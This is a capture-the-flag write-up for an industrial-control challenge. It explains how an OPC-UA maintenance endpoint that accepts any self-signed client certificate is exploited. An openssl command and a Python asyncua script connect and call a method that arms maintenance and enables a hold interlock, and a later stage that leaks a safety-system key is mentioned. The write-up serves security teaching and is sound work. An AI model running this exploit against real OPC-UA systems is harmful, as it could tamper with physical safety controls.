# Reentry Bay 3/5 — Maintenance Endpoint (OPC-UA)

**Flag:** `reentry{s3lf_s1gn3d_1nt0_th3_0pcu4_trust_l1st}`

| | |
|---|---|
| Category | OT/ICS · OPC-UA (missing client-certificate trust list) |
| Target | `opc.tcp://tcp.reentry.lol:30610/meridian/ot/` (offline now) |
| Tools | `openssl`, Python `asyncua` |
| Files | none |

> **Challenge brief:** Beside the gateway the bay runs an OPC-UA maintenance endpoint. It insists on
> an encrypted, certificate-bearing channel, which at commissioning time looked like diligence.
> Whoever commissioned it never finished deciding who was allowed in. Arm maintenance.

The hint: the client-certificate trust list was never configured, so the server requires encryption
but accepts **any self-signed certificate**.

---

## 1. Recon and the blocker

From stage 1's HMI recon: Modbus (30391/30771), OPC-UA (30610), sequencer console (30375/30294).

- An `asyncua` client with security policy `None` is refused: `No matching endpoints`.
- The server requires `Basic256Sha256` + `SignAndEncrypt`.

Two client-side gotchas to get right:
- `asyncua` recognizes PEM only by the `.pem` file extension — copy `client.crt`/`client.key` to
  `.pem` names.
- `await client.set_security(...)` — the coroutine must be awaited (otherwise it never runs).

## 2. Exploit

```bash
openssl req -x509 -newkey rsa:2048 -keyout certs/client.key -out certs/client.crt \
  -days 365 -nodes -subj "/CN=opcua-client"
cp certs/client.crt certs/client.pem
cp certs/client.key certs/client_key.pem
```

```python
import asyncio
from asyncua import Client
from asyncua.crypto.security_policies import SecurityPolicyBasic256Sha256
from asyncua.ua import MessageSecurityMode

async def arm():
    client = Client("opc.tcp://tcp.reentry.lol:30610/meridian/ot/")
    await client.set_security(
        SecurityPolicyBasic256Sha256,
        certificate="certs/client.pem",
        private_key="certs/client_key.pem",
        mode=MessageSecurityMode.SignAndEncrypt,
    )
    await client.connect()
    maint_node = client.get_node("ns=2;i=1")   # MAINT
    arm_node   = client.get_node("ns=2;i=4")   # MAINT.Arm()
    result = await maint_node.call_method(arm_node)
    print(result)   # "maintenance armed :: reentry{...}"
    await client.disconnect()

asyncio.run(arm())
```

The connection succeeds with the **first self-signed certificate**. Browsing `Objects` (namespace
2) shows a `MAINT` node with `Status = "SAFE - maintenance not armed"`, `Note = "see maintenance
log history"`, and an `Arm()` method. Calling `MAINT.Arm()` returns the flag and sets the status to
`"ARMED - hold interlock enabled"`.

🚩 **Flag:** `reentry{s3lf_s1gn3d_1nt0_th3_0pcu4_trust_l1st}`

> **Note:** The server is offline now, so this cannot be re-run. The `MAINT.Note` ("see maintenance
> log history") is the hook for stage 5's OPC-UA HistoryRead, which leaks the SIS key.

---

## Lesson

Requiring encryption/signing on an OPC-UA channel is a **different decision** from managing trust in
client certificates (the trust list). Doing the first without the second is "a lock on the door with
no list of who holds a key" — anyone with their own self-signed cert gets in.

> **Previous:** [2 - Thruster Telemetry](2%20-%20Thruster%20Telemetry.md) · **Next:** [4 - Sequencer Firmware](4%20-%20Sequencer%20Firmware.md)
